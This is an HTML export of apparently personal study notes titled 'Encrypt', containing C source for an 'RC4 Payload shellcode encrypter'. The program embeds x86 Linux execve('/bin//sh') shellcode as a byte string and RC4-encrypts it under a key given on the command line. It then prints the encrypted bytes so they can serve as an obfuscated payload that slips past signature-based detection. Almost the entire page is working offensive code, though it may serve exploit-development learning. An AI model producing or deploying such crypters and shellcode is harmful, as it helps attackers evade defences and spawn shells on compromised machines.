<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Encrypt</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Encrypt</h1><br/>/*<br /><br />RC4crypter.c<br /><br />*/<br /><br />#include &lt;stdio.h&gt;<br />#include &lt;stdlib.h&gt;<br />#include &lt;string.h&gt;<br /><br />#define ARRAY_LENGTH 256<br /><br />unsigned char s[ARRAY_LENGTH];<br />int rc4_i;<br />int rc4_j;<br /><br />unsigned char shellcode[] = \<br />"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";<br /><br />swap(unsigned char *s1, unsigned char *s2)<br />{<br />	char temp = *s1;<br />	*s1 = *s2;<br />	*s2 = temp;<br />}<br /><br />int InitRC4(void)<br />{<br />	int i;<br /><br />	for(i = 0; i &lt; ARRAY_LENGTH; i++)<br />		s[i] = i;<br /><br />	rc4_i = rc4_j = 0;<br /><br />	return 1;<br />}<br /><br />int DoKSA(unsigned char *key, int key_len)<br />{<br />	for(rc4_i = 0; rc4_i &lt; ARRAY_LENGTH; rc4_i++)<br />	{<br />		rc4_j = (rc4_j + s[rc4_i] + key[rc4_i % key_len]) % ARRAY_LENGTH;<br />		swap(&amp;s[rc4_i], &amp;s[rc4_j]);<br />	}<br />	rc4_i = rc4_j = 0;<br />}<br /><br />char GetPRGAOutput(void)<br />{<br />	rc4_i = (rc4_i + 1) % ARRAY_LENGTH;<br />	rc4_j = (rc4_j + s[rc4_i]) % ARRAY_LENGTH;<br />	swap(&amp;s[rc4_i], &amp;s[rc4_j]);<br />	return s[(s[rc4_i] + s[rc4_j]) % ARRAY_LENGTH];<br />}<br /><br /><br />main(int argc, char **argv)<br />{<br />	unsigned char *encryption_key;<br />	int encryption_key_length;<br />	unsigned char data_byte;<br />	unsigned char keystream_byte;<br />	unsigned char encrypted_byte;<br />	int shellcode_len;<br />	int counter;<br /><br />	if (argc != 2)<br />	{<br />		printf("RC4 Payload shellcode encrypter\n\n");<br />		printf("Usage: %s &lt;key as string&gt; \n", argv[0]);<br />		exit(0);<br />	}<br /><br />	encryption_key = (unsigned char *)argv[1];<br />	encryption_key_length = strlen((char *)encryption_key);<br /><br />	if(encryption_key_length &gt; ARRAY_LENGTH)<br />	{<br />		printf("Key too large, should be &lt;= 256 characters.\n");<br />		exit(-1);<br />	}<br /><br />	InitRC4();<br />	DoKSA(encryption_key, encryption_key_length);<br />	<br />	shellcode_len = strlen(shellcode);<br />	printf("Dumping RC4 encrypted shellcode\n\n\n\"");<br />	<br />	for(counter = 0; counter &lt; shellcode_len; counter++)<br />	{<br />		data_byte = shellcode[counter];<br />		keystream_byte = GetPRGAOutput();<br />		encrypted_byte = data_byte ^ keystream_byte;<br />		printf("\\x%02x", encrypted_byte);<br />	}<br /><br />	printf("\"\n\n");<br />	return 1;<br />}		<br /></div></body></html>